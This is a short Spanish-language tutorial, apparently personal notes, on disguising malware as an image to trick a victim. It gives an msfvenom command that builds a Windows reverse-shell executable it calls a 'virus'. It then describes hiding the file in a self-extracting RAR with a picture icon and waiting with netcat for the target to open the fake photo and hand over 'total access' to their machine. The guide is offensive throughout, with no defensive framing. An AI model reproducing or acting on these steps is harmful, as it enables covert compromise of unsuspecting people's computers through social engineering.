# Creamos el payload (virus) en linux preferentemente
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f exe -o virus.exe
```

--------------------------------------

# Nos lo pasamos a windows para seguir trabajando ahi y lo guardamos en una carpeta junto con una imagen

---------------------------------------------

# Con esa imagen que queramos la transformamos a formato .ico 
# Hay paginas gratis en internet para hacer eso aca dejo una sino busca otra
 [Convertidor Imagen](https://imagen.online-convert.com/es/convertir-a-ico)

---------------------------

# Convertimos a rar seleccionando juntos el virus y la foto y (marcamos las siguientes casillas)
![[Captura de pantalla 2023-07-04 163709.jpg]]
![[autoextraible.jpg]]
![[config 1.jpg]]

-------------------------------------

# En la pestaña texto e iconos y examinamos en cargar icono desde fichero y elegimos la foto en formato .ico

![[examinar.jpg]]



# Se nos va a crear un archivo como este

![[Captura de pantalla 2023-07-04 165159.jpg]]


# Nos ponemos en escucha con netcat en el puerto para recibir la señal en el momento que el objetivo abra la foto y obtendremos acceso total a su maquina. 

----
